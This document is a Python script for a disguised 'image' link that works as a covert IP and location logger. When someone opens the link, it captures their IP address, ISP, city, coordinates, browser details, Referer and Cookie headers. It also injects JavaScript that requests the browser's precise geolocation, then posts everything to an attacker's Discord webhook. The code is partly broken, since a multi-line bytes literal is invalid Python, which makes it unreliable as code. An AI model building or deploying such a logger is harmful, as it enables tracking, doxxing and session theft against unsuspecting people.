from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser, traceback

config = {
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE",
    "image": "https://example.com/image.png",
    "username": "Enhanced Logger",
    "color": 0x00FFFF,
    "accurateLocation": True,
}

def send_webhook(data):
    requests.post(config["webhook"], json=data)

def make_report(ip, useragent, cookies, referer, coords=None):
    os, browser = httpagentparser.simple_detect(useragent)
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=66842623").json()
    
    embed = {
        "username": config["username"],
        "embeds": [
            {
                "title": "Enhanced Logger - IP Logged",
                "color": config["color"],
                "description": f"""
                **User Opened the Image!**
                
                **IP Info:**
                - **IP:** `{ip}`
                - **ISP:** `{info.get('isp', 'Unknown')}`
                - **Country:** `{info.get('country', 'Unknown')}`
                - **Region:** `{info.get('regionName', 'Unknown')}`
                - **City:** `{info.get('city', 'Unknown')}`
                - **Coords:** `{coords if coords else f"{info.get('lat')}, {info.get('lon')}"}`
                - **Google Maps:** [View Location](https://www.google.com/maps/search/?api=1&query={coords if coords else f"{info.get('lat')},{info.get('lon')}"})
                
                **Device Info:**
                - **OS:** `{os}`
                - **Browser:** `{browser}`
                
                **Headers:**
                - **Referer:** `{referer}`
                - **Cookies:** `{cookies}`
                
                **User Agent:**
                ```
                {useragent}
                ```
                """,
            }
        ],
    }
    send_webhook(embed)

class LoggerHandler(BaseHTTPRequestHandler):
    def handle_request(self):
        try:
            ip = self.headers.get("x-forwarded-for", "Unknown")
            useragent = self.headers.get("User-Agent", "Unknown")
            referer = self.headers.get("Referer", "None")
            cookies = self.headers.get("Cookie", "None")
            
            query = parse.urlparse(self.path).query
            params = dict(parse.parse_qsl(query))
            coords = base64.b64decode(params.get("g", "").encode()).decode() if "g" in params else None
            
            make_report(ip, useragent, cookies, referer, coords)
            
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            self.wfile.write(b"<script>")
            if config["accurateLocation"]:
                self.wfile.write(b"navigator.geolocation.getCurrentPosition(pos => {
                    var loc = btoa(pos.coords.latitude + ',' + pos.coords.longitude);
                    if (!window.location.href.includes('?')) {
                        window.location.href += '?g=' + loc;
                    } else {
                        window.location.href += '&g=' + loc;
                    }
                });")
            self.wfile.write(b"</script>")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            send_webhook({"content": f"Error: {traceback.format_exc()}"})

    do_GET = handle_request
    do_POST = handle_request

handler = app = LoggerHandler
